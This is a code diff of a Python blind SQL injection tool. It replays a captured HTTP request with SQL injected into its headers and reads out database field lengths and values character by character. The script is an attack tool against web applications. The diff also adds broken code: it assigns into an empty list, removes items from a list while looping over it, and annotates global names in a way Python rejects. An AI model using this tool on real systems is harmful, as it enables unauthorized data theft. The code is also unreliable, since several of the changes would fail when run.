@@ -3,8 +3,10 @@ from io import BytesIO
 from http.server import BaseHTTPRequestHandler
 import argparse
 import io
+from operator import index
 from pprint import pprint
 import sys
+from typing import Literal
 from urllib import response
 import requests
 
@@ -87,7 +89,7 @@ message = email.message_from_file(io.StringIO(headers_alone))
 protocol = "https://" if args.ssl else "http://"
 headers = dict(message.items())
 url = f"{protocol}{headers['Host']}{request_line.replace('GET ', '').replace(' HTTP/1.1', '')}"
-dbVersion = "UNKNOWN"
+dbVersion: Literal['SQL'] | Literal['ORACLE'] | str = "UNKNOWN"
 
 field_length = 0
 current_value = 0
@@ -95,7 +97,7 @@ current_index = 0
 enumerated_value = ""
 
 
-def isSqlCompatible():
+def isSqlCompatible() -> bool:
     global dbVersion
     print("Checking SQL is being used")
     inject(SQL[args.type]["BASIC"], False)
@@ -111,7 +113,7 @@ def isSqlCompatible():
     return False
 
 
-def getSQLCommand(key):
+def getSQLCommand(key) -> str:
     match dbVersion:
         case "SQL":
             return SQL[args.type][key]
@@ -140,7 +142,7 @@ def enumerateFieldLength(tableName, columnName, columnValue):
     global field_length
     print("Getting field length...")
     for x in range(FIELD_LENGTH_LIMIT):
-        field_length = x
+        field_length: int = x
 
         inject("LENGTH_CHECK")
 
@@ -156,27 +158,32 @@ def enumerateFieldValue(tableName, columnName, columnValue):
     global current_value
     global enumerated_value
 
+    indexes: list[int] = []
+    for i in range(field_length):
+        indexes[i] = i
+
     print("Enumerating field values...")
 
-    for x in range(field_length):
-        current_index = x+1
+    for x in indexes:
+        current_index: int = x+1
 
         for val in payloadValues:
-            current_value = val
+            current_value: str = val
 
             inject("VALUE_CHECK")
 
             if executeRequestAndReturnsError():
+                indexes.remove(x)
                 enumerated_value += val
 
 
 def inject(sqlKey, autolookup=True):
     global headers
 
-    orgSql = getSQLCommand(sqlKey) if autolookup else sqlKey
-    sql = Template(orgSql)
+    orgSql: str = getSQLCommand(sqlKey) if autolookup else sqlKey
+    sql: Template = Template(orgSql)
 
-    safeSql = sql.safe_substitute(
+    safeSql: str = sql.safe_substitute(
         tableName=tableName, columnName=columnName, columnValue=columnValue, lengthTndex=field_length, currentIndex=current_index, currentValue=current_value)
 
     for header, value in message.items():
